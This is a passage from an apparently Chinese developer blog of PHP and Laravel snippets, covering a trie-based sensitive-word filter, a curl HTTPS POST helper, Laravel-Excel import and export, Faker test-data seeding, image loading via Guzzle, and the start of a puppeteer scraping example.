class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="敏感词过滤算法"><a href="#敏感词过滤算法" class="headerlink" title="敏感词过滤算法"></a>敏感词过滤算法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line">https:<span class="comment">//juejin.im/post/5cb56372f265da037d4fa133</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeMap</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public $data;  <span class="comment">// 节点字符</span></span><br><span class="line">    public $children = [];  <span class="comment">// 存放子节点引用（因为有任意个子节点，所以靠数组来存储）</span></span><br><span class="line">    public $isEndingChar = <span class="literal">false</span>;  <span class="comment">// 是否是字符串结束字符</span></span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;data = $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TrieTree</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 敏感词数组</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @var array</span></span><br><span class="line"><span class="comment">     * @author qpf</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public $trieTreeMap = array();</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;trieTreeMap = <span class="keyword">new</span> TreeMap(<span class="string">'/'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取敏感词Map</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @return array</span></span><br><span class="line"><span class="comment">     * @author qpf</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getTreeMap</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;trieTreeMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 添加敏感词</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param array $txtWords</span></span><br><span class="line"><span class="comment">     * @author qpf</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">addWords</span>(<span class="params">array $wordsList</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        foreach ($wordsList <span class="keyword">as</span> $words) &#123;</span><br><span class="line">            $trieTreeMap = $<span class="keyword">this</span>-&gt;trieTreeMap;</span><br><span class="line">            $len = mb_strlen($words);</span><br><span class="line">            <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">                $word = mb_substr($words, $i, <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span>(!isset($trieTreeMap-&gt;children[$word]))&#123;</span><br><span class="line">                    $newNode = <span class="keyword">new</span> TreeMap($word);</span><br><span class="line">                    $trieTreeMap-&gt;children[$word] = $newNode;</span><br><span class="line">                &#125;</span><br><span class="line">                $trieTreeMap = $trieTreeMap-&gt;children[$word];</span><br><span class="line">            &#125;</span><br><span class="line">            $trieTreeMap-&gt;isEndingChar = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查找对应敏感词</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param string $txt</span></span><br><span class="line"><span class="comment">     * @return array</span></span><br><span class="line"><span class="comment">     * @author qpf</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params">$txt</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $wordsList = array();</span><br><span class="line">        $txtLength = mb_strlen($txt);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $txtLength; $i++) &#123;</span><br><span class="line">            $wordLength = $<span class="keyword">this</span>-&gt;checkWord($txt, $i, $txtLength);</span><br><span class="line">            <span class="keyword">if</span>($wordLength &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                echo $wordLength;</span><br><span class="line">                $words = mb_substr($txt, $i, $wordLength);</span><br><span class="line">                $wordsList[] = $words;</span><br><span class="line">                $i += $wordLength - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $wordsList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 敏感词检测</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param $txt</span></span><br><span class="line"><span class="comment">     * @param $beginIndex</span></span><br><span class="line"><span class="comment">     * @param $length</span></span><br><span class="line"><span class="comment">     * @return int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">checkWord</span>(<span class="params">$txt, $beginIndex, $length</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $flag = <span class="literal">false</span>;</span><br><span class="line">        $wordLength = <span class="number">0</span>;</span><br><span class="line">        $trieTree = $<span class="keyword">this</span>-&gt;trieTreeMap; <span class="comment">//获取敏感词树</span></span><br><span class="line">        <span class="keyword">for</span> ($i = $beginIndex; $i &lt; $length; $i++) &#123;</span><br><span class="line">            $word = mb_substr($txt, $i, <span class="number">1</span>); <span class="comment">//检验单个字</span></span><br><span class="line">            <span class="keyword">if</span> (!isset($trieTree-&gt;children[$word])) &#123; <span class="comment">//如果树中不存在，结束        </span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果存在</span></span><br><span class="line">            $wordLength++; </span><br><span class="line">            $trieTree = $trieTree-&gt;children[$word];</span><br><span class="line">            <span class="keyword">if</span> ($trieTree-&gt;isEndingChar === <span class="literal">true</span>) &#123;  </span><br><span class="line">                $flag = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($beginIndex &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            $flag || $wordLength = <span class="number">0</span>; <span class="comment">//如果$flag == false  赋值$wordLenth为0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $wordLength;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = [<span class="string">'白粉'</span>, <span class="string">'白粉人'</span>, <span class="string">'白粉人嫩'</span>,<span class="string">'不该大'</span>];</span><br><span class="line">$wordObj = <span class="keyword">new</span> TrieTree();</span><br><span class="line">$wordObj-&gt;addWords($data);</span><br><span class="line"></span><br><span class="line">$txt = <span class="string">"白粉啊,白粉人，我不该大啊"</span>;</span><br><span class="line">$words = $wordObj-&gt;search($txt);</span><br><span class="line">var_dump($words);die;</span><br></pre></td></tr></table></figure>
<h3 id="curl-https"><a href="#curl-https" class="headerlink" title="curl https"></a>curl https</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">curl请求https，需要设置ipv4访问，ipv6的话会导致解析不了域名，php代码如下：</span><br><span class="line"><span class="comment">//请求https需要用ipv4</span></span><br><span class="line">$curl-&gt;setOption(CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);</span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * curl POST </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param   string  url </span></span><br><span class="line"><span class="comment"> * @param   array   数据 </span></span><br><span class="line"><span class="comment"> * @param   int     请求超时时间 </span></span><br><span class="line"><span class="comment"> * @param   bool    HTTPS时是否进行严格认证 </span></span><br><span class="line"><span class="comment"> * @return  string </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curlPost</span>(<span class="params">$url, $data = array(</span>), <span class="title">$timeout</span> = 30, <span class="title">$CA</span> = <span class="title">true</span>)</span>&#123;    </span><br><span class="line">  </span><br><span class="line">    $cacert = getcwd() . <span class="string">'/cacert.pem'</span>; <span class="comment">//CA根证书https://segmentfault.com/a/1190000005856334  </span></span><br><span class="line">    $SSL = substr($url, <span class="number">0</span>, <span class="number">8</span>) == <span class="string">"https://"</span> ? <span class="literal">true</span> : <span class="literal">false</span>;  </span><br><span class="line">      </span><br><span class="line">    $ch = curl_init();  </span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);  </span><br><span class="line">    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);  </span><br><span class="line">    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout<span class="number">-2</span>);  </span><br><span class="line">    <span class="keyword">if</span> ($SSL &amp;&amp; $CA) &#123;  </span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="literal">true</span>);   <span class="comment">// 只信任CA颁布的证书  </span></span><br><span class="line">        curl_setopt($ch, CURLOPT_CAINFO, $cacert); <span class="comment">// CA根证书（用来验证的网站证书是否是CA颁布）  </span></span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="number">2</span>); <span class="comment">// 检查证书中是否设置域名，并且是否与提供的主机名匹配  </span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($SSL &amp;&amp; !$CA) &#123;  </span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>); <span class="comment">// 信任任何证书  </span></span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="number">1</span>); <span class="comment">// 检查证书中是否设置域名  </span></span><br><span class="line">    &#125;  </span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);  </span><br><span class="line">    curl_setopt($ch, CURLOPT_HTTPHEADER, array(<span class="string">'Expect:'</span>)); <span class="comment">//避免data数据过长问题  </span></span><br><span class="line">    curl_setopt($ch, CURLOPT_POST, <span class="literal">true</span>);  </span><br><span class="line">    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);  </span><br><span class="line">    <span class="comment">//curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data)); //data with URLEncode  </span></span><br><span class="line">  </span><br><span class="line">    $ret = curl_exec($ch);  </span><br><span class="line">    <span class="comment">//var_dump(curl_error($ch));  //查看报错信息  </span></span><br><span class="line">  </span><br><span class="line">    curl_close($ch);  </span><br><span class="line">    <span class="keyword">return</span> $ret;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-Excel3-0"><a href="#Laravel-Excel3-0" class="headerlink" title="Laravel-Excel3.0"></a>Laravel-Excel3.0</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> maatwebsite/excel</span><br><span class="line">app/app 注册服务及门面：</span><br><span class="line"></span><br><span class="line"><span class="string">'providers'</span> =&gt; [   </span><br><span class="line">    Maatwebsite\Excel\ExcelServiceProvider::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line">]</span><br><span class="line"><span class="string">'aliases'</span> =&gt; [ </span><br><span class="line">    <span class="string">'Excel'</span> =&gt; Maatwebsite\Excel\Facades\Excel::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line">]</span><br><span class="line">php artisan vendor:publish</span><br><span class="line"></span><br><span class="line">创建 app/exports/<span class="keyword">export</span>.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">namespace App\Exports;</span><br><span class="line"></span><br><span class="line">use Maatwebsite\Excel\Concerns\FromCollection;</span><br><span class="line">use Maatwebsite\Excel\Concerns\WithHeadings; <span class="comment">//设置标题</span></span><br><span class="line">use Maatwebsite\Excel\Concerns\ShouldAutoSize; <span class="comment">//自动单元格尺寸</span></span><br><span class="line">use PhpOffice\PhpSpreadsheet\Style\NumberFormat; <span class="comment">//设置单元格数据格式</span></span><br><span class="line">use Maatwebsite\Excel\Concerns\WithColumnFormatting; <span class="comment">//设置列格式</span></span><br><span class="line">use Maatwebsite\Excel\Concerns\WithStrictNullComparison; <span class="comment">//为空时零填充</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InvoicesExport</span> <span class="title">implements</span> <span class="title">FromCollection</span>,<span class="title">WithHeadings</span>,<span class="title">WithStrictNullComparison</span>,<span class="title">WithColumnFormatting</span>,<span class="title">ShouldAutoSize</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $data;</span><br><span class="line"></span><br><span class="line">    protected $header;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * Excel类的构造函数</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data, $header</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;data = $data;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;header = $header;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//导出数据逻辑</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">collection</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//首行标题</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">headings</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;header;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">//设置列格式</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">columnFormats</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="comment">//'E' =&gt; NumberFormat::FORMAT_DATE_XLSX14,</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">控制器中使用：</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">export</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $data = Post::get();</span><br><span class="line">    $header = [ <span class="string">'ID'</span>,</span><br><span class="line">        <span class="string">'姓名'</span>,</span><br><span class="line">        <span class="string">'年龄'</span>,</span><br><span class="line">        <span class="string">'性别'</span>,</span><br><span class="line">        <span class="string">'创建时间'</span>,</span><br><span class="line">        <span class="string">'修改时间'</span>];</span><br><span class="line">    <span class="keyword">return</span> \Excel::download(<span class="keyword">new</span> InvoicesExport($data, $header), <span class="string">"测试导出.xls"</span>);</span><br><span class="line">&#125;</span><br><span class="line">创建 app/Exports/Import.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">namespace App\Exports;</span><br><span class="line"></span><br><span class="line">use Maatwebsite\Excel\Concerns\ToArray;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Import</span> <span class="title">implements</span> <span class="title">ToArray</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="comment">//重新父类实现</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">array</span>(<span class="params">array $array</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $array;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">控制器使用：https:<span class="comment">//learnku.com/articles/26940</span></span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">import</span>(<span class="params">Request $request</span>)</span>&#123;</span><br><span class="line">    $file = $request-&gt;file(<span class="string">'file'</span>);</span><br><span class="line">    $data = \Excel::toArray(<span class="keyword">new</span> Import(), $file);</span><br><span class="line">    dd($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="数据填充功能生成中文测试数据"><a href="#数据填充功能生成中文测试数据" class="headerlink" title="数据填充功能生成中文测试数据"></a>数据填充功能生成中文测试数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$factory-&gt;define(App\Product::<span class="class"><span class="keyword">class</span>, <span class="title">function</span> (<span class="title">Faker</span>\<span class="title">Generator</span> $<span class="title">faker</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">'user_id'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">'name'</span> =&gt; $faker-&gt;name,</span><br><span class="line">        <span class="string">'mobile'</span> =&gt; $faker-&gt;phoneNumber,</span><br><span class="line">        <span class="string">'province'</span> =&gt; $faker-&gt;state,</span><br><span class="line">        <span class="string">'city'</span> =&gt; $faker-&gt;city,</span><br><span class="line">        <span class="string">'area'</span> =&gt; $faker-&gt;area,</span><br><span class="line">        <span class="string">'address'</span> =&gt; $faker-&gt;streetAddress,</span><br><span class="line">        <span class="string">'postcode'</span> =&gt; $faker-&gt;postcode,</span><br><span class="line">    ];</span><br><span class="line">&#125;);</span><br><span class="line">$factory-&gt;define(App\Address::<span class="class"><span class="keyword">class</span>, <span class="title">function</span> () </span>&#123;</span><br><span class="line">    $faker = Faker\Factory::create(<span class="string">'zh_CN'</span>);<span class="comment">//在 config\app.php 文件中加入 faker_locale =&gt; 'zh_CN' 就可以实现了</span></span><br><span class="line"><span class="comment">//https://tianyong90.com/2019/03/10/shi-yong-laravel-shu-ju-tian-chong-gong-neng-sheng-cheng-zhong-wen-ce-shi-shu-ju/</span></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">'user_id'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">'name'</span> =&gt; $faker-&gt;name,</span><br><span class="line">        <span class="string">'mobile'</span> =&gt; $faker-&gt;phoneNumber,</span><br><span class="line">        <span class="string">'province'</span> =&gt; $faker-&gt;state,</span><br><span class="line">        <span class="string">'city'</span> =&gt; $faker-&gt;city,</span><br><span class="line">        <span class="string">'area'</span> =&gt; $faker-&gt;area,</span><br><span class="line">        <span class="string">'address'</span> =&gt; $faker-&gt;streetAddress,</span><br><span class="line">        <span class="string">'postcode'</span> =&gt; $faker-&gt;postcode,</span><br><span class="line">    ];</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="intervention-image-坑"><a href="#intervention-image-坑" class="headerlink" title="intervention/image 坑"></a>intervention/image 坑</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 记录开始时间</span></span><br><span class="line">$startTimestamp = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">$url = <span class="string">'http://wx.qlogo.cn/mmopen/XxT9TiaJ1ibf06TNRCMjQADS4opDHvQLguLZHpqkRlvuJYZicvJW4iaOalPsKIs0kpZ3F6864ZzibyObYiaucUQSrdp4pFTNDyIpxw/0'</span>;</span><br><span class="line"></span><br><span class="line">$avatar = \Image::make($url);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 记录结束时间</span></span><br><span class="line">$endTimestamp = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">info($startTimestamp);</span><br><span class="line">info($endTimestamp);</span><br><span class="line">info($endTimestamp - $startTimestamp);</span><br><span class="line">$startTimestamp = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">$client = <span class="keyword">new</span> \GuzzleHttp\Client();</span><br><span class="line"></span><br><span class="line">$url = <span class="string">'http://wx.qlogo.cn/mmopen/XxT9TiaJ1ibf06TNRCMjQADS4opDHvQLguLZHpqkRlvuJYZicvJW4iaOalPsKIs0kpZ3F6864ZzibyObYiaucUQSrdp4pFTNDyIpxw/0'</span>;</span><br><span class="line"></span><br><span class="line">$avatarResponse = $client-&gt;get($url);</span><br><span class="line"></span><br><span class="line">$avatar = \Image::make($avatarResponse-&gt;getBody()-&gt;getContents());</span><br><span class="line"></span><br><span class="line">$endTimestamp = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">info($startTimestamp);</span><br><span class="line">info($endTimestamp);</span><br><span class="line">info($endTimestamp - $startTimestamp);</span><br><span class="line">先使用 GuzzleHttp 获取头像，再使用 Image::make($data) 创建头像。</span><br></pre></td></tr></table></figure>
<h3 id="puppeteer-采集异步加载的网页内容"><a href="#puppeteer-采集异步加载的网页内容" class="headerlink" title="puppeteer 采集异步加载的网页内容"></a>puppeteer 采集异步加载的网页内容</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ composer <span class="built_in">require</span> spatie/browsershot</span><br><span class="line">$ npm i puppeteer --save</span><br><span class="line">https:<span class="comment">//tianyong90.com/2019/03/10/laravel-zhong-shi-yong-puppeteer-cai-ji-yi-bu-jia-zai-de-wang-ye-nei-rong/#安装</span></span><br><span class="line">use Spatie\Browsershot\Browsershot;</span><br><span class="line"></span><br><span class="line">public <span class="function"><span 